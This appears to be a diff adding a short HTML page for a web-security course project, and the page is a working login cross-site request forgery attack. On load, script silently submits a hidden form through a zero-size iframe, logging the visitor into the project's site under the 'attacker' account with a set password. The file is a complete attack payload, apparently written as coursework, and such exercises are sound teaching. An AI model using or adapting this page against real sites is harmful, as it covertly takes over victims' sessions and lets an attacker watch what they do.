@@ -1,0 +1,13 @@
+<html>
+    <head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script></head>
+    <body>
+        <iframe width="0" height="0" frameborder="0" nane="frame1"></iframe>
+        <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="post" class="form-inline" name="form1" target="frame1">
+            <input id="username" name="username" type="hidden" value="attacker" required class="form-control">
+            <input id="userpass" name="password" type="hidden" value="l33th4x" required class="form-control">
+        </form>
+    </body>
+    <script>
+        document.forms['form1'].submit();
+    </script>
+</html>
